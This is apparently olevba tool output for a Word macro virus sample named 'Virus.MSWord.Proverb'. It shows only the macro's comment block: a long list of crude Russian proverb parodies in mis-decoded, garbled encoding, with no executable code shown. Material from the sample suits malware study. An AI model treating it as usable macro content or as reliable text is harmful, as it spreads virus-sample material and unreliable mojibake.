olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Proverb
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Proverb - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Ëˇáèøü êàòàòüñÿ - ïîëåçàé â êóçîâ.
'Hà áåçpûáüå è ñëîíà èç ìóõè ñäåëàåøü.
'Hà áåçáàáüå è ˝ûáó ˝àêîì.
'Hà áåçïòè÷üå è æîïà ñîëîâåé.
'Hà áåç˝ûáüå è ñàì ˝àêîì ñòàíåøü.
'Hà âî˝å è øàïêà ãëàçà êîëåò.
'Hà ãîëîì òåëå - çäî˝îâûé äóõ.
'Hà íåò íè òóäà íè ñóäà íåò.
'Hà ïîæà˝å è õ˝åí - âîäîï˝îâîä.
'Hà ¯îäèíå õî˝îøî, à äîìà ëó÷øå!
'Hà õàëÿâó è "¯ÀÌÀ" - ñëèâî÷íîå ìàñëî.
'Hà õàëÿâó è çâå˝ü áåæèò.
'Hà ÷óæîé ëîáîê íå ˝àçåâàé ˝îòîê!
'Hà ÷óæóˇ ê˝îâàòü ˝îò íå ˝àçåâàòü!
'Hàãëîñòü - âòî˝îå ñ÷àñòüå.
'Hàçâàëñÿ ã˝óçäåì, îáîñ˝àëñÿ è ñòîé.
'Hàçâàëñÿ êëèçìîé - ïîëåçàé â æîïó.
'Hàêîñÿ -ê, âûêópè!
'Hà˝îäó ñîá˝àëîñü - ÿáëîêó ïëˇíóòü íåãäå!
'Hå pîé ÿìó äpóãîìó, ÷òîáû îí íå èñïîëüçîâàë åå êàê îêîï.
'Hå âîäêîé åäèíîé ïüÿí ÷åëîâåê!
'Hå âñå òî çîëîòî, ÷òî ïëîõî ëåæèò.
'Hå âñå òî ñîëíûøêî, ÷òî âñòàåò.
'Hå ãîâî˝è ãîï, êîëè ˝îæà ê˝èâà.
'Hå äàâøè - ê˝åïèñü, à äàâøè - äå˝æèñü!
'Hå èìåé ñòî ä˝óçåé, à èìåé âñåõ â˝àãîâ!
'Hå èìåé ñòî ä˝óçåé, à èìåé íàãëóˇ ˝îæó.
'Hå èìåé ñòî ˝óáëåé, à èìåé ñòî áàêñîâ!
'Hå íûòüåì, òàê êàêàíüåì!
'Hå îòêëàäûâàé íà çàâòpà òî, ÷òî ìîæíî âûïèòü ñåãîäíÿ.
'Hå îòêëàäûâàé íà çàâò˝à òó, ÷òî ìîæåøü óæå ñåãîäíÿ!
'Hå ïåé èç êîëîäöà - ï˝èãîäèòñÿ ïëˇíóòü.
'Hå ïåíÿé íà çå˝êàëî, êîëè ÿéöà ìåøàˇò.
'Hå ïåíÿé íà çå˝êàëî, ïîêà íå ïå˝åï˝ûãíåøü.
'Hå ïëˇé â êàëîøó - ï˝èãîäèòñÿ â íåå ñàäèòüñÿ!
'Hå ïëˇé â êîëîäåö - âûëåòèò íå ïîéìàåøü.
'Hå ïëˇé â êîëîäåö - ñàì òóäà ïîïàäåøü.
'Hå ïëˇé â êîëîäåö - òàì æå íèêîãî íåò...
'Hå ïîæåëàé áëèæíåìó æåíû ñâîåé.
'Hå ïîìèíàéòå Ãîñïîäà... âñóíåì!
'Hå ñëåäè çà õâîñòîì, à òî íå çàìåòèøü ˝îãîâ...
'Hå ñïåøè, à òî óñïååøü!
'Hå ñóé ñâîé âçíîñ íå â ñâîå äåëî!
'Hå òàê ñò˝àøåí ÷å˝ò, êàê åãî ìàëˇòêà!
'Hå òÿíè ˝åçèíó çà õâîñò â äîëãèé ÿùèê.
'Hå óâå˝åí - íå òî˝ìîçè!
'Hå ÿéöà ê˝àñÿò ÷åëîâåêà, à ÷åëîâåê ÿéöà!
'Håò ïîâåñòè ïå÷àëüíåå íà ñâåòå, ÷åì ïîâåñòü î ìèíüåòå â òóàëåòå.
'Håò ïîâåñòè ïå÷àëüíåå íà ñâåòå,÷åì ïîâåñòü î çàêëèíèâøåì RESETe...
'Hå÷à íà çå˝êàëî ïåíÿòü - êîëè!
'Hå÷åãî çå˝êàëî ïèíàòü, êîëè ˝îæà ê˝èâà.
'Hè ïóêà, íè ï¸˝à!
'À çîìáè çäåñü òèõèå
'À íå ïîéòè ëè ìíå íà ˝àáîòó,- ïîäóìàë ÿ. È íå ïîøåë.
'À ñóï˝óæåñêèé äîëã îòäàé ¯óáëÿìè
'À ñ÷àñòüå áûëî òàê âîçìîæíî.... è òàê âîçìîæíî...è âîò òàê...
'Àëêîãîëü â ìàëûõ äîçàõ áåçâ˝åäåí â ëˇáîì êîëè÷åñòâå!
'Àìå˝èêàíöû - ìû èç íåã˝îâ çâåçä íå äåëàåì
'Áàáà ñ âîçó - âûëåòèò - íå ïîéìàåøü.
'Áàáà ñ âîçó - êoáûëà â êópñå äåëà.
'Áàáà ñ âîçó - ïîòåõå ÷àñ.
'Áàáà ñ âîçó, è âîëêè ñûòû!
'Áàçà˝ êîïåéêó ëˇáèò
'Áåäó íàCLICKàë... (èç Windows'95)
'Áåç póáàøêè áëèæå ê òåëó.
'Áåç ï˝óäà íå âûòàùèøü è ˝ûáêó èç íåãî.
'Áåç ò˝óäà íå çàñóíåøü è òóäà.
'Áå˝åãè åãî êàê çåíèöó - âî êàê.
'Áå˝åãè ÷åñòü ñìîëîäó - ïîëˇáèøü è êîçëà!
'Áå˝åãè ÷åñòü ñìîëîäó, êîëè ˝îæà ê˝èâà.
'Áëèæå ê òåëó!
'Áîëüøîìó êî˝àáëˇ - áîëüøàÿ òî˝ïåäà.
'Áî˝îòüñÿ è èñêàòü, íàéòè è ïå˝åï˝ÿòàòü!
'Á˝îíåòåìêèí "Ïîíîñåö".
'Áóäåøü ìíîãî æèòü - ñêî˝î ñîñòà˝èøüñÿ
'Áóäåøü òèøå - äîëüøå áóäåøü
'Áûñò˝åå, ãëóáæå, íåæíåå.
'Â ãà˝åìàõ íåò ïëîõèõ òàíöî˝îâ
'Â ãîñòÿõ õî˝îøî, à äîìà ïëîõî.
'Â ãîñòÿõ õî˝îøî, à äîìà ó ìåíÿ íåòó.
'Â æåíñêèé ìîíàñòû˝ü ñî ñâîèì óñòàëûì íå õîäÿò
'Â êîíöå êîíöîâ, ñ˝åäè êîíöîâ, íàéäåøü êîíåö òû íàêîíåö.
'Â òåìíîòå âñå êîøêè ñå˝ˇò.
'Â ÷óæîå ÎÀÎ ñî ñâîèì óñòàâîì íå õîäÿò.
'Âåê âêëàäà íå âèäàòü.
'Âå˝à ìîæåò äâèãàòü ãî˝û, îíà - êîëîññàëüíàÿ áàáà.
'Âçÿëñÿ çà ãóæ - íå çàáóäü ñõîäèòü â äóø
'Âèäåòü âàñ - îäíî óäîâîëüñòâèå, à íå âèäåòü - ä˝óãîå
'Âèäíî ïòèöó ïî ïîìåòó
'Âèíî, äåâî÷êè, íî÷íàÿ Ìîñêâà, ìèëèöèÿ, ä˝àêè, ˝àçáèòûå àâòîìîáèëè, ˝àçî˝¸ííûå ãí¸çäà ëˇáâè
'Âîäêà "Áó˝àòèíî" - ïî÷óâñòâóéòå ñåáÿ ä˝îâàìè
'Âîçüìè êîíÿ çà ˝îãà!
'Âîëêîâ áîÿòüñÿ - â ëåñó íå åáàòüñÿ!
'Â˝åìÿ ëå÷èò, íî äîêòî˝ - áûñò˝åå.
'âñå ãåíèàëüíîå - ï˝îñòûíü
'Âñå ãåíèòàëüíîå ï˝îñòî.
'Âñå ëèøíåå - äåòÿì!
'Âñ¸ íå òàê ïëîõî êàê âû äóìàåòå, âñå íàìíîãî õóæå
'Âñå õî˝îøî, ÷òî õî˝îøî êà÷àåòñÿ
'Âûéòè â ãî˝îä: ó ëˇäåé ïîñìîò˝åòü, äà ñâîé ïîêàçàòü...
'Ãäå ñîâîê - òàì è ìóñî˝.
'Ãåíèòàëèè âñåõ ñò˝àí - ñîåäèíÿéòåñü!
'Ãëyïûé ïèíãâèí pîáêî ïpÿ÷åò, õèòpûé - íàãëî äîñòàåò.
'Ãëàâíîå, ˝åáÿòà, ïå˝öåì íå ñòà˝åòü
'Ãîâî˝ÿò, ÷òî ñìåõ ï˝îäëåâàåò æèçíü òîãî, êòî ñìååòñÿ, î÷åâèäíî çà ñ÷åò æèçíè òîãî, íàä êåì
'Ãîëîä íå òåòêà - â ëåñ íå óáåæèò.
'Ãîëîä íå òåòêà - ïîëˇáèøü è êîçëà.
'Ãîëóáàÿ ìå÷òà - íàéòè ä˝óãà
'Ãîñòåé âñòpå÷àˇò ïî îäåæêå, à ïpîâîæàˇò - ïî ìîpäå!
'Ãîòîâü ñàíè ëåòîì, à ÷åñòü ñìîëîäó.
'Ã˝îøà âûåäåííîãî íå ñòîèò.
'Äàæå åñëè âàñ ñúåëè, ó âàñ åñòü äâà âûõîäà
'Äàæå õî˝îøåé òàíöîâùèöå ïî˝îé ìåøàåò òî, ÷òî ìåøàåò ïëîõîìó òàíöî˝ó
'Äàé äó˝àêó õóé ñòåêëÿííûé, îí è õóé ˝àçîáüåò è ˝óêè ïî˝åæåò.
'Äàéòå ñîëäàòó òî÷êó îïî˝û, è îí... óñíåò.
'Äàëüøå - áîëüøå...áûñò˝åå, âûøå, ñèëüíåå...
'Äà˝åíîìó ï˝îâàéäå˝ó â êàíàë íå ñìîò˝ÿò.
'Äà˝îì - çà àìáà˝îì, ïîíÿë
'Äå ˇ˝î, äå ôàêòî, äå áèëî.
'Äåëó âpåìÿ, ïîòåõå - äåíüãè.
'Äå˝æè ñåáÿ â ˝óêàõ!, åñëè òåáÿ íå äå˝æàò íîãè.
'Äåòè - öâåòû æèçíè. Äà˝èòå æåíùèíàì öâåòû!
'Äëèííûå íîãè - íå ˝îñêîøü, à ñ˝åäñòâî ïå˝åäâèæåíèÿ
'Äíåì ñ îãíåì, âå÷å˝îì - ˝àçîãíåì
'Äî ñàìûõ êîñòåé ìîçãà...
'Äîëã íàãèøîì ïëàòÿò
'Äîëã ïëàòåæîì ñò˝àøåí.
'Äîëã ï˝îöåíòîì ê˝àñåí.
'Äîìà íåã˝à è ñòåíû íåíàâèäÿò.
'Äîìà îò âîpà è ñòåíû íå ïîìîãóò.
'Ä˝óã ïîçíàåòñÿ â áèä˛.
'Ä˝óãà íåëüçÿ êóïèòü, çàòî åãî ìîæíî ï˝îäàòü.
'Ä˝óæáà ä˝óæáîé, íî êóäà æå äåòü ëèáèäî?
'Ä˝óçüÿ ïîçíàˇòñÿ â åäå
'¨æ ïòèöà ãî˝äàÿ. Ïîêà íå ïíåøü - íå ïîëåòèò!
'Åñëè Âû ï˝îñíóëèñü íà óëèöå, çíà÷èò Âû òàì çàñíóëè
'Åñëè ãîëîâà áîëèò, çíà÷èò îíà åñòü
'Åñëè íåëüçÿ, íî î÷åíü õî÷åòñÿ, òî ìîæíî!
'Åñëè õî÷åøü ïåòü - ïåé!
'Åñëè õî÷åøü ïî˝àáîòàòü - ëÿã, ïîñïè, è âñå ï˝îéäåò!
'Åñòü åùå ïî˝îõ â ïî˝îõîâíèöàõ è ÿãîäû â ÿãîäèöàõ! (è âëàãà âî âëàãàëèùå)
'Åñòü åù¸ øà˝û â øà˝îâà˝àõ
'Æà˝åíîìó êîíˇ â æîïó íå ñìîò˝ÿò.
'Æåëàåì Âàì ñ÷àñòüÿ, çäî˝îâüÿ è òâî˝÷åñêèõ óçáåêîâ
'Æåëàˇ Âàì çäî˝îâüÿ â ëè÷íîé æèçíè
'Æåíùèíû ëˇáÿò ìóæ÷èíó â ñåáå, à ìóæ÷èíû ñåáÿ â æåíùèíå!
'Æåíùèíû ñïîñîáíû íà âñå, ìóæ÷èíû - íà âñå îñòàëüíîå
'Æèçíü - â˝åäíàÿ øòóêà - îò íåå óìè˝àˇò...
'Æèçíü íåâîçìîæíî ïîâå˝íóòü íàçàä, äà è çà÷åì îíà òàì?
'Æèçíü ï˝îæèòü - íå äâà ïàëüöà îáîññàòü!
'Æèëà-áûëà äåâî÷êà, ñàìà âèíîâàòà.
'Çà äâóìÿ çàéöàìè ïîãîíèøñÿ - äó˝àêàì çàêîí íå ïèñàí.
'Çà äâóìÿ çàéöàìè ïîãîíèøñÿ - íà òàïî˝ íàïî˝åøüñÿ.
'Çà äâóìÿ çàéöàìè ïîãîíèøñÿ - íèêóäà íå äîçâîíèøñÿ.
'Çà äâóìÿ çàéöàìè ïîãîíèøüñÿ - îò îáîèõ ïî ìîpäå ïîëó÷èøü.
'Çà äâóìÿ çàéöàìè ïîãîíèøüñÿ - ò˝åòüåãî íå ïîéìàåøü!
'Çà îäíîãî áèòîãî 15 ñóòîê äàˇò.
'Çàìûñåë áåç óìûñëà íàçûâàåòñÿ âûìûñëîì.
'Çà˝ÿæåííîìó òàíêó â äóëî íå ñìîò˝ÿò.
'Çäåñü áóäåò ãî˝îä çàëîæåí - íàäïèñü íà ëîìáà˝äå.
'Çä˝àâñòâóéòå, ìóæ÷èíû è æåíùèíû, à òàê æå òå, ó êîãî åù¸ âñå âïå˝åäè
'Çåìëè - ê˝åñòüÿíàì, çàâîäû - ˝àáî÷èì, ïèâî - ÌÍÅ.
'Çóáîâ áîÿòñÿ - â ˝îò íå äàâàòü.
'È áàáà ñ âîçó, è âîëêè ñûòû
'È âîëêè ñûòû, è îâöû öåëêè.
'È æåíùèíà, êàê áó˝ÿ, óëåãëàñü
'È íà åëêó çàëåçòü, è æîïó íå îáîä˝àòü.
'È óõîì íå ìî˝ãíóë!
'Èçãîòîâèì ïî˝ò˝åò âàøåãî â˝àãà íà òóàëåòíîé áóìàãå
'Èíûõ óæ íåò, ä˝óãèõ - äîëå÷èì
'Èñêóññòâî ò˝åáóåò æå˝òâ, è ñ êàæäûì äíåì èõ ñòàíîâèòñÿ âñå áîëüøå.
'Èùè íåã˝à íî÷üˇ!
'Êàæäàÿ ïèïåòêà ìå÷òàåò ñòàòü êëèçìîé
'Êàæäîé òâà˝è - ïî ïà˝å. (òàê ãîâî˝èë íåêèé ï˝åïîä íà ˛êçàìåíå)
'Êàæäîé òâà˝è - ïî õà˝å!
'Êàæäûé ìóæ÷èíà èìååò ï˝àâî íàëåâî
'Êàæäûé íà˝îä èìååò òàêîå ï˝àâèòåëüñòâî, êîòî˝îå èìååò åãî.
'Êàê äâà áàéòà ïå˝åñëàòü...
'Êàê ìíîãî äåâóøåê õî˝îøèõ, à ÿ ëˇáëˇ æåíàòîãî
'Êàê ìíîãî äåâóøåê õî˝îøèõ, íî òÿíåò ÷òî-òî íà ïëîõèõ
'Êàê óïîèòåëüíà â ¯îññèè âåò÷èíà
'Êàêîâ ñòîë, òàêîâ è ñòóë.
'Êàêîé áûñò˝ûé åçäîê íå ëˇáèò "¯óññêîé"
'Êàïëÿ íèêîòèíà óáèâàåò ëîøàäü, à õîìÿêà ˝àç˝ûâàåò íà êóñêè
'Êèøêà òîíêà, è òàíêè íàøè áûñò˝û!
'Êëèçìà, Çíàé ñâîå ìåñòî
'Êîìó òîøíî, à êîìó è â ïîïó ìîæíî.
'Êîíåö - òåëó âåíåö
'Êîí÷èë ìèìî - ãóëÿé ñìåëî.
'Êîí÷èë ñìåëî - ãóëÿé ìèìî.
'Ê˝àñíà èçáà íå êóòåæàìè, à ñâîåâ˝åìåííûìè ïëàòåæàìè
'Ê˝åï÷å çà øîôå˝êó äå˝æèñü, áà˝àí
'Ê˝ûøà åñòü - óìà íå íàäî.
'Êòî pàíî âñòàåò, òîò pàíî ïîìpåò.
'Êòî ê íàì ñ ìå÷îì ï˝èä¸ò, òîò â î˝àëî è ïîëó÷èò.
'Êòî ê íàì ñ ˝óáëåì ï˝èøåë - òîò îò ˝óáëÿ è ïîãèáíåò
'Êòî êó˝èò - êîí÷àåò ˝àêîì, à êòî á˝îñàåò êó˝èòü - îòòÿãèâàåò ñâîé êîíåö.
'Êòî íà ˝îÿëè èã˝àåò, òîò åå è íîñèò
'Êòî íå ˝àáîòàåò, òîò ïüåò!
'Êòî ïîñëåäíèé, òîò è ââîäèò.
'Êòî ïîñëåäíèé, òîò è ïàïà!
'Êòî ˝àíüøå âñòàë, òîãî è òàïêè
'Êóäà íè êèíü, ñàì òóäà ïîïàäåøü.
'Êóé æåëåçî íå îòõîäÿ îò êàññû!
'Ëåæèò áîåö, íå ñï˝àâèëñÿ ñ àòàêîé
'Ëåòè ñ ï˝èâåòîì, âå˝íèñü óìíûì
'Ëîæèñü äåâêà è áîëüøàÿ è ìàëåíüêàÿ.
'Ëó÷øå ãî˝ ìîãóò áûòü òîëüêî ãî˝öû
'Ëó÷øå èìåòü ñèíèöó â ˝óêàõ, ÷åì óòêó ïîä ê˝îâàòüˇ.
'Ëó÷øå èìåòü ñèíèöó, êîãäà îíà â ˝óêàõ!
'Ëó÷øå êîëûìèòü íà Ãîíäó˝àñå, ÷åì ãîíäó˝àñèòü íà Êîëûìå
'Ëó÷øå ïå˝åñïàòü, ÷åì íåäîåñòü
'Ëó÷øå ñèíèöà â ˝óêàõ, ÷åì óòêà ïîä ê˝îâàòüˇ
'Ëó÷øå óæàñíûé êîíåö, ÷åì óæàñ áåç êîíöà.
'Ëó÷øèé ñïîñîá ïîêîí÷èòü â ñåáÿ - íàëîæèòü ñåáå â ˝óêè.
'Ëûñûé ïåøåìó íå êîííûé.
'Ëˇáâè âñå ïëîñêîñòè ïîêî˝íû
'Ëˇáèìàÿ, òàêèõ, êàê òû, íå áûëî, íåò è íå íàäî
'Ëˇáèòå ¯îäèíó, ìàòü âàøó!
'Ëˇáèøü êàòàòüñÿ - êàòèñü ê ÷åpòîâîé ìàòåpè!
'Ëˇáèøü êàòàòüñÿ - ëˇáè è êàòàéñÿ!
'Ëˇáèøü êàòàòüñÿ - ëˇáè è ñ ñàíêàìè åáàòüñÿ.
'Ëˇáèøü êàòàòüñÿ, èìåé ñòî ˝óáëåé.
'Ëˇáèøü êàòàòüñÿ, ëˇáè è ñàìî÷åê âîçèòü!
'Ìàë çîëîòíèê, äà è âçÿòü íåãäå.
'Ìàëåíüêàÿ ˝ûáêà ëó÷øå áîëüøîãî òà˝àêàíà
'Ìàëü÷èê êîí÷èë â òàìïîí.
'Ìàíèêˇ˝ -ìåäèêàì, ïåäèêˇ˝ - ïåäèêàì
'Ìàøó ïàëüöåì íå èñïî˝òèøü.
'Ìåíÿ ãîëûìè íîãàìè íå âîçüìåøü!!!
'Ìåíÿˇ ï˝îèã˝ûâàòåëü íà âûèã˝ûâàòåëü.
'Ìåñòàìè ñòàòü áû Ãóëëèâå˝îì
'Ìè˝ DOOM 'ó òâîåìó...
'Ìèòÿ èäåò íà ìèòèíã à Ïåòÿ èäåò íà ïåòòèíã.
'Ìîãèëà ãî˝áàòîãî - ñï˝àâà.
'Ìîé äÿäÿ ñàìûõ ÷åñòíûõ ã˝àáèë
'Ìîé äÿäÿ ñàìûõ ÷åñòíûõ ã˝àáèë.
'Ìîéòå ˝óêè âìåñòî åäû.
'Ìîéòå ˝óêè, ïå˝åä è çàä
'Ìóæ÷èíà - ˛òî òàêàÿ òâà˝ü, õóæå êîòî˝îé ìîæåò áûòü òîëüêî æåíùèíà.
'Ìóæ÷èíà ãîíÿåòñÿ çà æåíùèíîé, ïîêà îíà åãî íå ïîéìàåò
'ìóæ÷èíû -Æåíèòåñü, Æåíùèíû - Ìóæàéòåñü
'Ìû ï˝èäåì ê Âàì íà âû˝ó÷êó, åñëè åñòü âû˝ó÷êà
'Íà îøèáêàõ ìó÷àˇòñÿ
'Íà ïòè÷üèõ ï˝àâàõ äàëåêî íå âçëåòèøü
'Íàäïèñü íàä ïèññóà˝îì: "Íå ëüñòè ñåáå, ïîäîéäè ïîáëèæå"
'Íàì õèìèÿ áëîíäèíîê ïîäà˝èëà
'Íàøè ïîåçäà - ñàìûå ïîåçäàòûå ïîåçäà â ìè˝å
'Íå áîëòàéòå å˝óíäîé
'Íå á˝îñàé ä˝óãà â áèäå
'Íå âñå òî çîëîòî, ÷òî ïëîõî ëåæèò
'Íå âñå òî ñîëíûøêî, ÷òî âñòàåò
'Íå ìîãó ñòîÿòü êîãäà ä˝óãèå ˝àáîòàˇò, ïîéäó ïîëåæó
'Íå ìîãó ñòîÿòü íà ñâîåì, î÷åíü áîëüíî
'íå îòâëåêàˇòñÿ, ëˇáÿ
'Íå ïå˝åïèëèñü åùå íà ¯óñè áîãàòû˝è-äîá˝û ìîëîäöû
'Íå ïî Õóàíó ñîìá˝å˝î
'Íå ïî˝íî, äà çàäî˝íî
'Íå ˝îé ä˝óãîìó ÿìó, ïóñòü ñàì ˝îåò
'Íå ˝óáè ñóê, íà êîòî˝ûõ ñèäèøü
'Íå ñâèñòè - äåâîê íå áóäåò
'Íå ñòîé ïîä ñò˝óåé
'Íå ñóé ñâîé âçíîñ íå â ñâîå äåëî
'Íå òàê ñò˝àøåí ÷å˝ò, êàê åãî ìàëˇòêà
'Íå óìååøü ïåòü - íå ïåé
'Íå ó÷è îòöà è áàñòà
'Íåâåñòà çàïàòåíòîâàëà ï˝åäëîæåíèå æåíèõà
'Íåòó äåíåã - ï˝èâÿæèòå ñçàäè âåíèê, áåãèòå è ìåòèòå, íàìåòåòå - ï˝èíîñèòå
'Íèæå ïåéäæå˝à íå áåé
'Íè÷òî íå ê˝àñèò òàê æåíùèí, êàê ïå˝åêèñü âîäî˝îäà
'Íó è çàï˝îñû ó âàñ - ñêàçàëà áàçà äàííûõ è ïîâèñëà.
'Íû˝íóë ñ àêâàëàíãîì - íå ï˝èêèäûâàéñÿ øëàíãîì
'Î ÷åì ó íàñ ãîâî˝èòñÿ, âñå â äåëî ãîäèòñÿ
'Îáèâàˇ äâå˝è êîæåé çàêàç÷èêà
'Îáíàëè÷èì Íîáåëåâñêóˇ ï˝åìèˇ
'Îäèí â ïîëå - õóæå òàòà˝èíà.
'Îäíà ãîëîâà - õîpîøî, à äâà ñàïîãà ïàpà.
'Îäíà ãîëîâà õî˝îøî, à âñå òåëî ëó÷øå
'Îäíàæäû â ñòóäåíóˇ çèìíˇˇ ïî˝ó ñìîò˝ˇ - ïîäíèìàåòñÿ ìåäëåííî
'Îäíàæäû ëåáåäü ˝àêîì ùóêó...
'Îí ñêàçàë: "Ïîåõàëè" è çàïèë âîäîé
'Îíà áûëà ëèøåíà äåâñòâåííîñòè ñò˝åëîé àìó˝à
'Îíà êîíå÷íî íå Âåíå˝à, íî ÷òî-òî âåíå˝è÷åñêîå â íåé åñòü...
'Îíà íà íåãî ˝óêîé ïëˇíóëà.
'Î˝àëüíûé ñåêñ ñ âûòåêàˇùèìè îòòóäà ïîñëåäñòâèÿìè.
'Îñòàâü îäåæäó, âñÿê ñˇäà âõîäÿùèé!
'Îñòàíîâèòå Çåìëˇ, ÿ ñîéäó
'Îòäàì êîíöû â õî˝îøèå ˝óêè.
'Ïàïóàñ ïàïóàñó ä˝óã, òîâà˝èù è êî˝ì.
'Ïå˝âûé áëèí ìàñëîì íå èñïî˝òèøü.
'Ïèâî ñ óò˝à íå òîëüêî â˝åäíî, íî è ïîëåçíî
'Ïèîíå˝êà - âñåì ˝åáÿòàì ï˝èìå˝êà.
'Ïëàòè íå ëîìàéñÿ - ïîòîì íàñëàæäàéñÿ
'Ïëà÷åò äåâî÷êà â áàíêîìàòå
'Ïëîõ òîò ñîëäàò, êîòî˝ûé íå ìå÷òàåò ñïàòü ñ ãåíå˝àëîì'
'Ïëîõ òîò ñîëäàò, êîòî˝ûé íå õî÷åò.
'Ïëîõ òîò ñîëäàò, êîòî˝ûé óïàë è íå îòæàëñÿ.
'Ïî íîãàì òåêëî, à â ˝îò íå ïîïàëî!
'Ïîä ëåæà÷èé êàìåíü ìû âñåãäà óñïååì
'Ïîéìàë ìûøà - åøü íå ñïåøà
'Ïîêà ñåìü ˝àç îòìå˝èøü - ä˝óãèå óæå îò˝åæóò!
'Ïîëüçóÿñü ñëó÷àåì, õî÷ó
'Ïîñ˝åäñòâîì ìà˝àçìà äîéäåì äî î˝ãàçìà
'Ïîñòîÿòü çà ñåáÿ, ïîëåæàòü çà ä˝óãèõ
'Ïîòå˝ÿëñÿ ÷å˝íûé äèïëîìàò, íàøåäøåãî ï˝îñÿò ñäàòü åãî â ïîñîëüñòâî Íèãå˝èè
'Ïî÷åì âû äåâóøêè ê˝àñèâûõ ëˇáèòå
'Ïî÷¸ì Âû, äåâóøêè, ê˝àñèâûõ ëˇáèòå
'Ï˝åäëàãàˇ ˝óêó è ñå˝öå â îáìåí íà ã˝óäü è áåä˝à
'Ï˝èøåë, óâèäåë è óøåë.
'Ï˝èøåë , óâèäåë, ïîáåëèë
'Ï˝îäàåòñÿ ìàëü÷èê íà ïîáåãóøêàõ. Ï˝îáåã 3000 âå˝ñò.
'Ï˝îòÿíó íîãè â õî˝îøèå ˝óêè
'Ï˝îõîäè , Ëîæèñü, çä˝àâñòâóé
'¯àáîòà - íå âîëê, à ïpîèçâåäåíèå ñèëû íà pàññòîÿíèå.
'¯àáîòà íå õ˝åí - 100 ëåò ï˝îñòîèò.
'¯åáÿòà, ñ Ìîíèêîé Ëåâèíñêè íàäî êîí÷àòü
'¯îâíî â ïîëíî÷ü íà÷íóò áèòü ê˝åìëåâñêèå êó˝ñàíòû.
'¯îæäåííûé á˝àòü äàâàòü íå ìîæåò.
'¯îæäåííûé ïîëçàòü óïàñòü íå ìîæåò
'¯ûáàê ˝ûáàêà íåíàâèäèò íàâå˝íÿêà
'Ñ êåì ïîâåäåøñÿ, ñ òåì è íàáå˝åøñÿ.
'Ñ êåì ïîâåäåøüñÿ - îò òîãî è çàáå˝åìåíååøü.
'Ñ êåì ïîâåäåøüñÿ - òàê òåáå è íàäî
'Ñ êî˝àáëÿ íà áàá.
'Ñ ìûëîì ˝àé è â øàëàøå
'Ñ íàñòóïàˇùèì Âàñ îïüÿíåíèåì
'Ñâåæî ïèòàíèå, äà ñå˝åòñÿ ñ ò˝óäîì!
'Ñâîÿ Hàòàøêà áëèæå ê òåëó.
'Ñâîÿ ñìè˝èòåëüíàÿ ˝óáàøêà áëèæå ê òåëó.
'Ñâÿòî ìåñòî ñ áˇñòîì íå áûâàåò
'Ñäåëàé äîá˝îå äåëî è îíî òåáÿ äîñòàíåò!
'Ñäåëàë äåëî - áàáó ñ âîçà.
'Ñäåëàë äåëî - âûìîé òåëî
'Ñäåëàë äåëî - êîáûëå ëåã÷å.
'Ñäåëàë äåëî - ñëåçàé ñ òåëà.
'Ñåêñ áåç äèâ÷èíû - ï˝èçíàê äó˝à÷èíû
'Ñåìå˝î îäíîãî êîçëÿò.
'Ñåìå˝î îäíîãî íàéäóò
'Ñåìå˝î îäíîãî íàéäóò.
'Ñåìü ïÿäåé â ëîáêå...
'Ñåìü ˝àç îá äâå˝ü, îäèí ˝àç îá ˝åëüñ
'Ñåìü ˝àç îòïåé, îäèí ˝àç îòúåøü
'Ñêàæè-êà ò¸òÿ, òû íå äà˝îì
'Ñêàæèòå, âû â ìóëüòôèëüìàõ íå ñíèìàëèñü
'Ñêàçàëà "ÍÅÒ" è ãîëîâîé êèâíóëà
'Ñêëå˝îç âûëå÷èòü íåëüçÿ, çàòî î íåì ìîæíî çàáûòü
'Ñêîëüêî â êîëîäåö íå ïëˇé, à âñå pàâíî â ëåñ òÿíåò.
'Ñêîëüêî âîäêè íå áå˝è, âñå ˝àâíî äâà ˝àçà áåãàòü
'Ñêîëüêî âîëêà íå êî˝ìè, à îí âñå ˝àâíî åñò!
'Ñêîëüêî âîëêà íå êî˝ìè, à îí âñå ˝àâíî ëîá ˝àñøèáåò!
'Ñêîëüêî âîëêà íå êî˝ìè, à îí âñå ˝àâíî ñìîò˝èò!
'Ñêîëüêî âîëêà íå êî˝ìè, à ó ñëîíà âñå ˝àâíî áîëüøå!
'Ñêîëüêî Ëåí - ñòîëüêî Çèí
'Ñëîâî íå âî˝îáåé, íà ãîëîâó íå íàñ˝¸ò!
'Ñëîâî íå âî˝îáåé, ïîéìàˇò - âûëåòèøü.
'Ñíèìàˇ, ïî˝÷ó.
'Ñíèìó ò˝óñû
'Ñî ç˝åíèåì ïëîõî, äåíåã íå âèæó
'Ñîâåòñêèå êó˝èöû - ñàìûå ñò˝îéíûå êó˝èöû â ìè˝å
'Ñîâåòñêèå ìèê˝îñõåìû - ñàìûå áîëüøèå ìèê˝îñõåìû â ìè˝å!
'Ñîëäàò ïî îñåíè ñ÷èòàˇò.
'Ñîëíöå âñòàëî âûøå åëè - â˝åìÿ ñ˝àòü, à ìû íå åëè.
'Ñïè÷êè äåòÿì íå ïîìåõà.
'Ñòà˝îñòü - íå ˝àäîñòü, ìà˝àçì - íå î˝ãàçì
'Ñòà˝ûé ä˝óã ëó÷øå 2 ïîä˝óã
'Ñóï˝óæåñêèé äîëã. Èñïîëíÿåòñÿ âïå˝âûå
'Ñ÷àñòëèâûå ò˝óñîâ íå íàäåâàˇò
'Ñ÷àñòüå åñòü, îíî íå ìîæåò íå åñòü
'Ñûòûé êîííîìó íå ïåøèé
'Ñûòûé ïüÿíîãî íå ˝àçóìååò.
'Òàì õî˝îøî, ãäå íàñ!
'Òàìîæíÿ áå˝åò äîá˝î
'Òåìíîòà - çàëîã çäîpîâüÿ.
'Ò¸òè äî 16 ëåò íå äîïóñêàˇòñÿ
'Òèïóí âàì íà âàø âåëèêèé è ìîãó÷èé ˝óññêèé ÿçûê
'Òèõà óê˝àèíñêàÿ íî÷ü, íî ÑÀËÎ íàäî ïå˝åï˝ÿòàòü
'Òèøå áóäåøü - äàëüøå óåäåøü.
'Òèøå åäåøü - äàëüøå áóäåøü (îò òîãî ìåñòà - êóäà åäåøü) .
'Òèøå åäåøü - òîëùå ìî˝äà.
'Òèøå åäåøü - õ˝åí ï˝èåäåøü!
